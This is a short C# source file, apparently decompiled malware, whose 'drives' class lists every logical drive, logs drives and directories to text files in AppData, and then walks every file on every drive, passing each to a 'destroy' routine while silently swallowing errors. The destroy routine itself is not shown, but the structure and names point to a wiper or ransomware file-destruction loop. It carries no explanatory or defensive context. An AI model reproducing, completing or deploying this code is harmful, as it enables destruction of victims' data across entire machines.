using System;
using System.IO;

public class drives
{
	public static void m()
	{
		string[] logicalDrives = Directory.GetLogicalDrives();
		string[] array = logicalDrives;
		foreach (string text in array)
		{
			File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\asd3.txt", text + Environment.NewLine);
		}
		string[] array2 = File.ReadAllLines(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\asd3.txt");
		string[] array3 = array2;
		foreach (string path in array3)
		{
			try
			{
				string[] files = Directory.GetFiles(path);
				string[] array4 = files;
				foreach (string gfggfdfdf in array4)
				{
					destroy.m(gfggfdfdf);
				}
				string[] directories = Directory.GetDirectories(path);
				string[] array5 = directories;
				foreach (string text2 in array5)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\asd4.txt", text2 + Environment.NewLine);
				}
			}
			catch
			{
			}
		}
		string[] array6 = File.ReadAllLines(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\asd4.txt");
		string[] array7 = array6;
		foreach (string path2 in array7)
		{
			try
			{
				string[] files2 = Directory.GetFiles(path2, "*", SearchOption.AllDirectories);
				string[] array8 = files2;
				foreach (string gfggfdfdf2 in array8)
				{
					destroy.m(gfggfdfdf2);
				}
			}
			catch
			{
			}
		}
	}
}
